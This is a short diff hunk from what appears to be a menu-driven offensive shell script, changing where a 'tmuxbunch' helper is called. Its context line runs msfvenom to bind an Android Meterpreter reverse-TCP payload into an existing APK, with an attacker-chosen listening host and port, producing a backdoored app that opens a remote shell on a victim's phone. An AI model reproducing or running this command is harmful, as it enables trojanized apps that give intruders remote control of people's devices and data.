@@ -258,8 +258,9 @@ echo
 echo "[*] Please wait while binding......."
 cd $HOME/metasploit-framework
 ./msfvenom -x $OUTPUT -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
-./tmuxbunch
 fi
+cd $dir
+./tmuxbunch
 ;;
 7) echo
 echo
